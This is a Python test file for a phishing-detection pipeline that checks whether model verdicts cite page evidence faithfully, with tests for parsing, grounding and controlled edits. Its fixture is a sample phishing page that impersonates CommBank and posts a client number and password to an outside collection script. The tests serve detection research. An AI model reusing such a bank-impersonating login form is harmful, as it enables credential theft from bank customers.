"""Enough tests to prove the pipeline holds together. Run with: pytest -q"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

import pytest  # noqa: E402

from phishfaith import citation_view, grounding, interventions, parse  # noqa: E402

URL = "http://commbank-netbank-secure.rr7.tk/logon"
HTML = """<html><head><title>CommBank</title></head><body>
<form action="http://rr7.tk/collect.php" method="post">
<input type="text" name="clientnumber"><input type="password" name="password">
<button>Log on</button></form><p>&copy; 2019 Commonwealth Bank of Australia</p></body></html>"""


@pytest.fixture
def view():
    return citation_view.build(URL, HTML)


def test_every_rendered_line_is_its_own_quote_target(view):
    for sid, src in view.sources.items():
        assert f"[{sid}] {src.text}" in f"[{sid}] {view.sources[sid].text}"
        assert src.text in view.render() or sid == "U1"


def test_password_field_is_classified_credential(view):
    creds = view.ids_of_kind("credential")
    assert any(view.sources[c].attrs.get("type") == "password" for c in creds)


def test_parse_accepts_attribute_and_element_forms():
    a = parse.parse('<result><verdict>phishing</verdict><evidence>'
                    '<item source_id="H1" exact_quote="abc"/></evidence></result>')
    b = parse.parse("<result><verdict>phishing</verdict><evidence><item>"
                    "<source_id>H1</source_id><exact_quote><![CDATA[abc]]></exact_quote>"
                    "</item></evidence></result>")
    assert a.verdict == b.verdict == "phishing"
    assert a.citations[0].source_id == b.citations[0].source_id == "H1"
    assert a.citations[0].exact_quote == b.citations[0].exact_quote == "abc"


def test_grounding_separates_the_three_outcomes(view):
    pw = next(s for s in view.sources.values() if s.attrs.get("type") == "password")
    out = parse.parse(
        "<result><verdict>phishing</verdict><evidence>"
        f'<item source_id="{pw.source_id}" exact_quote="type=&quot;password&quot;"/>'
        '<item source_id="H99" exact_quote="anything"/>'
        f'<item source_id="{pw.source_id}" exact_quote="a paraphrase of the field"/>'
        "</evidence></result>"
    )
    statuses = grounding.check(view, out).statuses
    assert statuses == [grounding.GROUNDED, grounding.INVALID_ID, grounding.NOT_LOCATABLE]


def test_c2_c3_c4_touch_only_what_they_should(view):
    pw = next(s.source_id for s in view.sources.values() if s.attrs.get("type") == "password")
    cited = {"U1", pw}

    v2, iv2 = interventions.build_c2(view, pw)
    interventions.verify_single_change(view, v2, {pw})
    assert 'type="password"' not in v2.sources[pw].text
    assert iv2.kind == interventions.DECISION_EVIDENCE

    matched = interventions.pick_matched_uncited(view, cited, pw)
    assert matched is not None and matched not in cited
    v3, iv3 = interventions.build_c3(view, matched, iv2)
    interventions.verify_single_change(view, v3, {matched})
    assert iv3.operator_matched is True
    assert iv3.operator == iv2.operator
    assert iv3.kind == interventions.LABEL_PRESERVING

    v4, iv4 = interventions.build_c4(view)
    interventions.verify_single_change(view, v4, {"P1", "P2"})
    assert iv4.kind == interventions.LABEL_PRESERVING


def test_domain_intervention_is_flagged_as_not_label_preserving(view):
    _, iv = interventions.build_c2(view, "U1")
    assert iv.kind == interventions.DECISION_EVIDENCE
    assert interventions.NEUTRAL_HOST in iv.after


def test_matched_control_prefers_same_tag_over_same_kind(view):
    """The operator follows the tag, so a same-tag candidate must win.

    The password field and the form are both `credential`, but only another
    <input> can take C2's operator.
    """
    pw = next(s.source_id for s in view.sources.values() if s.attrs.get("type") == "password")
    matched = interventions.pick_matched_uncited(view, {"U1", pw}, pw)
    assert view.sources[matched].tag == "input"


def test_bank_client_number_counts_as_a_credential_field(view):
    """"client number" is what CommBank asks for; a user/email word list misses it."""
    field = next(s for s in view.sources.values() if s.attrs.get("name") == "clientnumber")
    assert field.kind == "credential"


def test_c3_flags_an_unmatched_operator(view):
    title = next(s.source_id for s in view.sources.values() if s.tag == "title")
    _, c2 = interventions.build_c2(view, title)
    para = next(s.source_id for s in view.sources.values() if s.tag == "p")
    _, c3 = interventions.build_c3(view, para, c2)
    assert c3.operator_matched is False
